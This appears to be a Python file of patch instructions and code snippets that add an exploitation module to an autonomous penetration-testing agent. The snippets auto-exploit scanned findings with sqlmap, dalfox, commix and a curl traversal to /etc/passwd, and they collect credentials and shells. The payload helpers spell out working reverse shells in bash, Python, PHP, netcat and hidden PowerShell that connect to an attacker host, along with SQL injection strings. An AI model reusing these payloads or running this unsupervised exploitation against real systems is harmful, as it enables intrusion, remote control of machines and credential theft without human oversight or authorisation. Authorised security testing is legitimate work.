"""
INTEGRATION INSTRUCTIONS FOR autonomous_agent.py

This file contains the code snippets to integrate the exploitation module
into your existing autonomous_agent.py file.

FOLLOW THESE STEPS:
==================

STEP 1: Add imports at the top of autonomous_agent.py (after existing imports)
------------------------------------------------------------------------
"""

# Add these imports after the existing imports in autonomous_agent.py:
IMPORTS_TO_ADD = '''
# Exploitation module integration
try:
    from exploitation.integration import (
        ExploitationManager,
        get_post_exploitation_commands
    )
    EXPLOITATION_MODULE_AVAILABLE = True
except ImportError:
    EXPLOITATION_MODULE_AVAILABLE = False
    logger.warning("[AutonomousPentestAgent] Exploitation module not available")
'''


"""
STEP 2: Add exploitation_manager initialization in __init__ method
------------------------------------------------------------------
Add this after self.learning_module initialization (around line 54):
"""

INIT_CODE_TO_ADD = '''
        # Initialize exploitation module
        self.exploitation_manager = None
        if EXPLOITATION_MODULE_AVAILABLE:
            try:
                self.exploitation_manager = ExploitationManager(self.tool_manager)
                print("[AutonomousPentestAgent] ExploitationManager initialized")
            except Exception as e:
                logger.warning(f"[AutonomousPentestAgent] Failed to init ExploitationManager: {e}")
'''


"""
STEP 3: Add the exploit_finding method to the class
---------------------------------------------------
Add this method to the AutonomousPentestAgent class:
"""

EXPLOIT_FINDING_METHOD = '''
    async def exploit_finding(
        self,
        finding: Dict[str, Any],
        scan_state: Dict[str, Any]
    ) -> Dict[str, Any]:
        """
        Attempt to exploit a vulnerability finding using the exploitation module.
        
        Args:
            finding: Vulnerability finding from scanning
            scan_state: Current scan state
            
        Returns:
            Exploitation result dictionary
        """
        if not EXPLOITATION_MODULE_AVAILABLE or self.exploitation_manager is None:
            logger.warning("[Agent] Exploitation module not available, using fallback")
            return await self._fallback_exploit(finding, scan_state)
        
        # Build context from scan state
        context = {
            'target': scan_state.get('target', ''),
            'url': scan_state.get('target', ''),
            'host': self._extract_host(scan_state.get('target', '')),
            'port': finding.get('port', 80),
            'lhost': scan_state.get('config', {}).get('lhost', '127.0.0.1'),
            'lport': scan_state.get('config', {}).get('lport', 4444),
            'service': finding.get('service', ''),
            'endpoint': finding.get('endpoint', finding.get('url', '/')),
            'parameter': finding.get('parameter', 'id'),
        }
        
        # Add any CVE IDs
        if finding.get('cve'):
            context['cve_ids'] = finding['cve'] if isinstance(finding['cve'], list) else [finding['cve']]
        
        logger.info(f"[Agent] Attempting exploit for: {finding.get('type', 'unknown')}")
        
        try:
            # Use exploitation manager
            result = await self.exploitation_manager.exploit_finding(finding, context)
            
            # Convert result to standard format
            exploit_result = {
                'success': result.is_success,
                'status': result.status.value,
                'exploit_id': result.exploit_id,
                'shell_obtained': result.shell_obtained,
                'credentials_found': result.credentials_found,
                'extracted_data': result.extracted_data,
                'output': result.output[:2000] if result.output else '',
                'recommendations': result.recommendations,
                'execution_time': result.execution_time,
            }
            
            # If shell obtained, add post-exploitation commands
            if result.shell_obtained:
                exploit_result['post_exploit_commands'] = get_post_exploitation_commands(
                    shell_type='linux',
                    objective='enumerate'
                )
            
            return exploit_result
            
        except Exception as e:
            logger.error(f"[Agent] Exploitation error: {e}")
            return {
                'success': False,
                'status': 'error',
                'error': str(e),
            }
    
    async def _fallback_exploit(
        self,
        finding: Dict[str, Any],
        scan_state: Dict[str, Any]
    ) -> Dict[str, Any]:
        """Fallback exploitation without the exploitation module"""
        vuln_type = finding.get('type', '').lower()
        target = scan_state.get('target', '')
        
        # Map vulnerability types to basic exploit commands
        exploit_map = {
            'sql_injection': f"sqlmap -u '{target}' --batch --dbs",
            'sqli': f"sqlmap -u '{target}' --batch --dbs",
            'xss': f"dalfox url '{target}' --silence",
            'command_injection': f"commix --url='{target}' --batch",
            'lfi': f"curl -s '{target}/../../etc/passwd'",
        }
        
        command = exploit_map.get(vuln_type)
        if not command:
            return {'success': False, 'status': 'no_exploit', 'message': f'No exploit for {vuln_type}'}
        
        # Execute via tool manager
        result = self.tool_manager.execute_tool_direct(command, timeout=300)
        
        return {
            'success': bool(result.get('output')),
            'status': 'executed',
            'command': command,
            'output': result.get('output', '')[:2000],
        }
    
    def _extract_host(self, target: str) -> str:
        """Extract hostname from target URL"""
        import re
        from urllib.parse import urlparse
        
        if target.startswith(('http://', 'https://')):
            parsed = urlparse(target)
            return parsed.hostname or target
        
        # IP pattern
        ip_match = re.match(r'^(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', target)
        if ip_match:
            return ip_match.group(1)
        
        return target.split('/')[0].split(':')[0]
'''


"""
STEP 4: Modify the _execute_exploitation_phase method
-----------------------------------------------------
Replace or enhance the existing exploitation logic with this:
"""

ENHANCED_EXPLOITATION_PHASE = '''
    async def _execute_exploitation_phase_enhanced(
        self,
        scan_state: Dict[str, Any]
    ) -> Dict[str, Any]:
        """
        Enhanced exploitation phase using the exploitation module.
        
        This method:
        1. Prioritizes findings by severity and exploitability
        2. Uses exploitation templates for known vulnerabilities
        3. Generates and crafts payloads
        4. Executes exploits safely
        5. Handles post-exploitation if successful
        """
        findings = scan_state.get('findings', [])
        exploitation_results = []
        
        # Sort findings by severity (high to low)
        sorted_findings = sorted(
            findings,
            key=lambda f: f.get('severity', 0) if isinstance(f.get('severity'), (int, float)) else 0,
            reverse=True
        )
        
        # Filter to exploitable findings
        exploitable_types = [
            'sql_injection', 'sqli', 'xss', 'command_injection', 'rce',
            'lfi', 'rfi', 'ssrf', 'auth_bypass', 'file_upload'
        ]
        
        exploitable_findings = [
            f for f in sorted_findings
            if f.get('type', '').lower() in exploitable_types
            or f.get('exploitable', False)
            or f.get('cve')  # Any finding with a CVE
        ]
        
        if not exploitable_findings:
            logger.info("[Agent] No exploitable findings, checking for CVEs in all findings")
            # Check all findings for CVEs
            exploitable_findings = [f for f in sorted_findings if f.get('cve')]
        
        logger.info(f"[Agent] Found {len(exploitable_findings)} exploitable findings")
        
        # Attempt exploitation on top findings
        max_attempts = scan_state.get('config', {}).get('max_exploit_attempts', 5)
        shells_obtained = 0
        
        for i, finding in enumerate(exploitable_findings[:max_attempts]):
            logger.info(f"[Agent] Attempting exploit {i+1}/{min(len(exploitable_findings), max_attempts)}: {finding.get('type', 'unknown')}")
            
            result = await self.exploit_finding(finding, scan_state)
            exploitation_results.append(result)
            
            if result.get('shell_obtained'):
                shells_obtained += 1
                logger.info(f"[Agent] SHELL OBTAINED! Moving to post-exploitation")
                
                # Store shell info for post-exploitation
                scan_state['shell_sessions'] = scan_state.get('shell_sessions', [])
                scan_state['shell_sessions'].append({
                    'finding': finding,
                    'result': result,
                    'timestamp': datetime.now().isoformat()
                })
                
                # If we got a shell, we can move to post-exploitation
                if shells_obtained >= 1:
                    break
            
            elif result.get('credentials_found'):
                logger.info(f"[Agent] Credentials found: {len(result['credentials_found'])}")
                # Store credentials for later use
                scan_state['credentials'] = scan_state.get('credentials', [])
                scan_state['credentials'].extend(result['credentials_found'])
        
        # Update scan state
        scan_state['exploitation_results'] = exploitation_results
        scan_state['shells_obtained'] = shells_obtained
        
        return {
            'phase': 'exploitation',
            'results_count': len(exploitation_results),
            'successful_exploits': sum(1 for r in exploitation_results if r.get('success')),
            'shells_obtained': shells_obtained,
            'credentials_found': len(scan_state.get('credentials', [])),
            'should_advance': shells_obtained > 0 or len(scan_state.get('credentials', [])) > 0,
        }
'''


"""
STEP 5: Add payload crafting helper methods
-------------------------------------------
Add these utility methods to the class:
"""

PAYLOAD_HELPER_METHODS = '''
    def get_reverse_shell_payload(
        self,
        lhost: str,
        lport: int,
        shell_type: str = 'bash'
    ) -> str:
        """
        Get a reverse shell payload.
        
        Args:
            lhost: Attacker IP address
            lport: Attacker listening port
            shell_type: Shell type (bash, python, php, nc, powershell)
            
        Returns:
            Reverse shell command string
        """
        if EXPLOITATION_MODULE_AVAILABLE and self.exploitation_manager:
            return self.exploitation_manager.craft_reverse_shell(
                lhost=lhost,
                lport=lport,
                shell_type=shell_type
            )
        
        # Fallback shells
        shells = {
            'bash': f'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1',
            'python': f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            'php': f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            'nc': f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f',
            'powershell': f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient('{lhost}',{lport})",
        }
        return shells.get(shell_type, shells['bash'])
    
    def get_sqli_payload(
        self,
        injection_type: str = 'union',
        columns: int = 5
    ) -> str:
        """
        Get a SQL injection payload.
        
        Args:
            injection_type: Type (union, blind_boolean, blind_time, auth_bypass)
            columns: Number of columns for UNION
            
        Returns:
            SQLi payload string
        """
        if EXPLOITATION_MODULE_AVAILABLE and self.exploitation_manager:
            return self.exploitation_manager.craft_sqli_payload(
                injection_type=f"{injection_type}_basic" if injection_type == "union" else injection_type,
                columns=columns
            )
        
        # Fallback payloads
        payloads = {
            'union': f"' UNION SELECT {','.join(['NULL']*columns)}-- -",
            'blind_boolean': "' AND 1=1-- -",
            'blind_time': "' AND SLEEP(5)-- -",
            'auth_bypass': "' OR '1'='1'-- -",
        }
        return payloads.get(injection_type, payloads['union'])
    
    def get_exploitation_stats(self) -> Dict[str, Any]:
        """Get exploitation module statistics"""
        if EXPLOITATION_MODULE_AVAILABLE and self.exploitation_manager:
            return self.exploitation_manager.get_stats()
        return {'available': False}
'''


# ============================================================================
# COMPLETE PATCH FUNCTION
# ============================================================================

def generate_patch_instructions():
    """Generate complete patch instructions"""
    
    instructions = """
================================================================================
AUTONOMOUS_AGENT.PY INTEGRATION PATCH
================================================================================

Follow these steps to integrate the exploitation module:

1. BACKUP YOUR FILE FIRST:
   cp backend/inference/autonomous_agent.py backend/inference/autonomous_agent.py.backup

2. ADD IMPORTS (after line ~25, after existing imports):
   
   # Exploitation module integration
   try:
       from exploitation.integration import (
           ExploitationManager,
           get_post_exploitation_commands
       )
       EXPLOITATION_MODULE_AVAILABLE = True
   except ImportError:
       EXPLOITATION_MODULE_AVAILABLE = False
       logger.warning("[AutonomousPentestAgent] Exploitation module not available")

3. ADD INITIALIZATION (in __init__, after line ~54):
   
   # Initialize exploitation module
   self.exploitation_manager = None
   if EXPLOITATION_MODULE_AVAILABLE:
       try:
           self.exploitation_manager = ExploitationManager(self.tool_manager)
           print("[AutonomousPentestAgent] ExploitationManager initialized")
       except Exception as e:
           logger.warning(f"[AutonomousPentestAgent] Failed to init ExploitationManager: {e}")

4. ADD THE NEW METHODS (at the end of the class):
   - exploit_finding()
   - _fallback_exploit()
   - _extract_host()
   - _execute_exploitation_phase_enhanced()
   - get_reverse_shell_payload()
   - get_sqli_payload()
   - get_exploitation_stats()
   
   (Copy from the EXPLOIT_FINDING_METHOD, ENHANCED_EXPLOITATION_PHASE, 
    and PAYLOAD_HELPER_METHODS constants above)

5. TEST THE INTEGRATION:
   python -c "from inference.autonomous_agent import AutonomousPentestAgent; a = AutonomousPentestAgent(); print(a.get_exploitation_stats())"

================================================================================
"""
    return instructions


if __name__ == "__main__":
    print(generate_patch_instructions())
